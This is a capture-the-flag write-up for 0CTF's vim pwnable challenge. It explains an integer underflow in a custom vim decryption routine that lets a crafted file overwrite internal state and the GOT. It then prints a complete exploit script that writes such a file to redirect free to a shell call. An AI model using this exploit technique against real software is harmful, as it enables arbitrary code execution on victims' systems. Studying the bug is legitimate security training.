# Pwn

0CTF is one of the best CTF events. It introduces some intermediate level real world pwn challenge. My team manages to solve the *vim* challenge. The *lua* is too difficult for me, but still interesting after reading its writeup

## if on a winter's night a traveler

This is a vim pwnable challenge. Basically, it provides us a binary file and a diff. From the diff, we can see that it adds a customized encryption method, which can be invoked by `:X`.

The `server.py` will read our input and then use vim to read it. Our goal is pretty clear now - this should be a *file format* style challenge. When the vim try to decrypt and parse the file, something goes wrong.

Let's see the decrypt part:
```c
void crypt_perm_decode(
    cryptstate_T *state,
    char_u	*from,
    size_t	len,
    char_u	*to) 
{
    perm_state_T *ps = state->method_state;
    size_t	i;

    if (len<=4)
    {
        for (i = 0; i < len; ++i)
            to[i] = from[i];
        return;
    }

    unsigned int iv;
    for (i = 0; i < 4; ++i)
    {
        to[i] = from[i];
        iv = (iv<<8) + from[i];
    }
    ps->orig_size = len-4;
    ps->size = ps->orig_size;
    while (!is_prime(ps->size))
        ps->size++;

    ps->shift = ps->key % (len-4);
    if (ps->shift > 0)
        ps->buffer = alloc(ps->shift);
    ps->step = ps->key ^ iv;
    if (ps->step % ps->size == 0)
        ps->step++;
    ps->cur_idx = 0;

    /* Step 1: Inverse of Multiplication */
    i = 4;
    while (i < len)
    {
        if (ps->cur_idx < ps->orig_size)
        {
            to[ps->cur_idx+4] = from[i];
            i++;
        }
        ps->cur_idx = (ps->cur_idx+ps->step)%ps->size;
    }

    /* Step 2: Inverse of Addition */
    for (i = 0; i < ps->shift; ++i)
        ps->buffer[i] = to[i+4];
    for (i = 4+ps->shift; i < len; ++i)
        to[i-ps->shift] = to[i];
    for (i = 0; i < ps->shift; ++i)
        to[len-ps->shift+i] = ps->buffer[i];

    if (ps->shift > 0)
        vim_free(ps->buffer);
}
```

The `from` is buffer of our file, and `to` is the buffer after decrypting. At the very beginning, it loads first 4 bytes(skip the magical header) to `iv`, which will be later loaded to ` ps->step = ps->key ^ iv;`, and eventually to `ps->cur_idx = (ps->cur_idx+ps->step)%ps->size;`. Let's have a quick recap of `ps`'s structure to reveal the issue here:
```c
typedef struct {
    int key;
    int shift;
    int step;
    int orig_size;
    int size;
    int cur_idx;
    char_u *buffer;
} perm_state_T;
```

Since we can control `iv` from the first 4 bytes. And `iv` is unsigned, but `cur_idx` and `sgep` are signed. We can underflow `to[ps->cur_idx+4] = from[i];` to overwrite previous structure `perm_state_T`. 

We can change `buffer` to GOT table, and finally overwrite it to `do_shell` to get shell.

Script from [Anciety](https://twitter.com/Anciety2):
```python
from pwn import *
import struct

def p32(content):
    return struct.pack('>I', content)

def p64(content):
    return struct.pack('>Q', content)

def main():
    magic = b'VimCrypt~04!'
    free_at_got = 0x8a8238
    #do_shell = 0x45f101
    do_shell = 0x4c9163

    write_what = b'\x6d'
    write_to = free_at_got - 8
    
    payload = p32(0xffffffff ^ 0x61)
    payload += write_what
    payload += p32(0xffffffff ^ 0x61)
    payload += p64(0x21)
    payload += p64(0)
    payload += p64(write_to) # buffer
    payload += b'\x00' # 1117
    binsh = bytes(reversed(b'/bin/sh;'))
    payload += (p64(do_shell)).rjust(0x6a - 0x34, b'\x00') # 1169 -> 1134 (to)
    payload += b'a' * 4
    payload += p64(0x21)
    payload += p64(0)
    payload += p64(write_to)
    payload += p64(0xffffffe0)
    payload += p64(0xb3)[:7]
    payload += p64(0x4036d6)
    payload += 'a'
    payload += p64(0xffffffff)
    payload += '\x00' * 8
    payload += p64(do_shell)[1:]
    payload += '\x00\x00*f tac'
    #payload += '\x00\x00\x00\x00\x00\x00'
    payload += cyclic((0xc4 - 0x6a - 4 - 8 - 8 - 8 - 8 - 8 - 8 - 8 - 8 - 24))
    payload += p64(do_shell)


    with open('exp', 'wb') as f:
        f.write(magic + payload)


if __name__ == '__main__':
    main()
```
